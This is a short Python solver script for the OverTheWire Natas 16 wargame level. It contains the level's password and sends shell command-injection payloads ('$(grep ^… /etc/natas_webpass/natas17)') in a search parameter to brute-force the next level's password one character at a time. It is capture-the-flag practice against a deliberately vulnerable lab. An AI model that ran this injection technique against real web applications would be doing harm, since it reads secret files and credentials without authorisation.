import requests
import string
import re

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = "http://%s.natas.labs.overthewire.org" % username
s = requests.Session()
r = s.get(url, auth = (username,password))

#chocolates$(grep A /etc/natas_webpass/natas17)

alphabet = string.ascii_letters + string.digits

discovered_username = ""

def injection(res, usr, idx):
    for char in alphabet:
        tmp_usr = usr + char
        _ended = True
        payload = {
            "needle": f'chocolates$(grep ^{tmp_usr} /etc/natas_webpass/natas17)'
        }
        r = s.get(url, params=payload, auth=(username, password))
        if not re.search("chocolates", r.text):
            _ended = False
            print(f"[+] Current : {tmp_usr}")
            injection(res, tmp_usr, idx + 1)
            if idx != 1:
                break
    if _ended and usr != '':
        print(f"[+] Found! : {usr}")
        res.append(usr)

usernames = []
injection(usernames, "", 1)
print(usernames)